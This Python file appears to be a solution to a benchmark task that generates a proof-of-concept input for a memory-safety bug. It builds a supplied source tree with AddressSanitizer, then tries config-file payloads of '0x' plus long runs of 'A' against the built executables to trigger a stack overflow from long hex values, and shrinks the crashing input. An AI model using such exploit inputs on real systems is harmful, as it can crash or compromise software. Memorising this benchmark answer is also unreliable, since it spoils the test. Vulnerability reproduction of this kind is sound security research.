import os
import sys
import subprocess
import tempfile
import re
import glob

class Solution:
    def solve(self, src_path: str) -> bytes:
        self.temp_dir_obj = tempfile.TemporaryDirectory()
        self.temp_dir = self.temp_dir_obj.name
        
        # 1. Extract source code
        subprocess.run(['tar', '-xf', src_path, '-C', self.temp_dir], 
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        src_root = self.temp_dir
        for item in os.listdir(self.temp_dir):
            if os.path.isdir(os.path.join(self.temp_dir, item)):
                src_root = os.path.join(self.temp_dir, item)
                break
        
        # 2. Build with ASAN
        env = os.environ.copy()
        flags = "-fsanitize=address -g"
        env['CFLAGS'] = flags
        env['CXXFLAGS'] = flags
        env['LDFLAGS'] = flags
        
        if os.path.exists(os.path.join(src_root, 'configure')):
            subprocess.run(['./configure'], cwd=src_root, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(['make', '-j8'], cwd=src_root, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif os.path.exists(os.path.join(src_root, 'CMakeLists.txt')):
             build_dir = os.path.join(src_root, 'build')
             os.makedirs(build_dir, exist_ok=True)
             subprocess.run(['cmake', '..'], cwd=build_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             subprocess.run(['make', '-j8'], cwd=build_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            subprocess.run(['make', '-j8'], cwd=src_root, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # 3. Find executables and library paths
        executables = []
        lib_dirs = set()
        for root, dirs, files in os.walk(src_root):
            for f in files:
                path = os.path.join(root, f)
                if f.endswith('.so'):
                    lib_dirs.add(root)
                if os.access(path, os.X_OK) and not f.endswith('.sh') and not f.endswith('.py') and not f.endswith('.so'):
                    try:
                        with open(path, 'rb') as fb:
                            if fb.read(4) == b'\x7fELF':
                                executables.append(path)
                    except:
                        pass
        
        if lib_dirs:
            env['LD_LIBRARY_PATH'] = ':'.join(lib_dirs) + ':' + env.get('LD_LIBRARY_PATH', '')

        # 4. Identify candidate keys from existing config files
        sample_keys = set()
        for ext in ['conf', 'cfg', 'ini', 'sample']:
            for fpath in glob.glob(os.path.join(src_root, f'**/*.{ext}'), recursive=True):
                try:
                    with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                        txt = f.read()
                        found = re.findall(r'^\s*([a-zA-Z0-9_-]+)\s*=', txt, re.MULTILINE)
                        sample_keys.update(found)
                except:
                    pass
        
        if not sample_keys:
            sample_keys.update(["config", "key", "option", "value", "id", "name"])

        sorted_keys = sorted(list(sample_keys))[:20]
        
        poc_file = os.path.join(self.temp_dir, 'poc.conf')
        
        # 5. Fuzzing Strategy
        # The vulnerability is "invalid handling of long hex values".
        # We construct payloads with "0x" followed by a long sequence of 'A' (hex 0x41).
        
        filler = b"A" * 1200 # Sufficiently large to trigger stack overflow (typically > 512)
        overflow = b"0x" + filler
        
        candidates = []
        for k in sorted_keys:
            candidates.append(k.encode() + b" = " + overflow + b"\n")
            candidates.append(k.encode() + b"=" + overflow + b"\n")
        
        candidates.append(overflow + b"\n")

        for exe in executables:
            for payload in candidates:
                with open(poc_file, 'wb') as f:
                    f.write(payload)
                
                # Check different argument patterns
                arg_list = [
                    [exe, poc_file],
                    [exe, '-c', poc_file],
                    [exe, '--config', poc_file],
                    [exe, '-f', poc_file]
                ]
                
                for args in arg_list:
                    if self.check_crash(args, env):
                        return self.minimize(exe, args, payload, poc_file, env)

        return b""

    def check_crash(self, cmd, env):
        try:
            res = subprocess.run(cmd, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, timeout=2)
            if res.returncode != 0 and b'AddressSanitizer' in res.stderr:
                return True
        except:
            pass
        return False

    def minimize(self, exe, args, payload, poc_path, env):
        # Find the filler sequence 'A...'
        match = re.search(b'(A{100,})', payload)
        if not match:
            return payload
            
        start, end = match.span(1)
        prefix = payload[:start]
        suffix = payload[end:]
        length = end - start
        
        low = 1
        high = length
        ans = length
        
        # Binary search for the minimum length that causes a crash
        while low <= high:
            mid = (low + high) // 2
            test_payload = prefix + b'A' * mid + suffix
            
            with open(poc_path, 'wb') as f:
                f.write(test_payload)
            
            if self.check_crash(args, env):
                ans = mid
                high = mid - 1
            else:
                low = mid + 1
        
        return prefix + b'A' * ans + suffix